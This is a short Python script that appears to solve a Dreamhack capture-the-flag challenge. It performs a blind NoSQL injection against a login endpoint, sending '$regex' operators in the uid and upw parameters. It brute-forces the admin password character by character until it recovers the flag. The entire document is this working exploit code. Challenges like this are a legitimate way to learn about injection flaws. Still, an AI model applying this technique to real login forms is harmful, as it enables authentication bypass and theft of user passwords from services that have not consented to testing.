import requests, string

HOST = "http://host3.dreamhack.games:14635"
GET_FLAG = string.digits + string.ascii_letters
flag = ""

for i in range(32):
    for ch in GET_FLAG:
        response = requests.get(f"{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}")
        if response.text == "admin":
            flag += ch
            break
    print('DH{' + flag + '}')
    
    
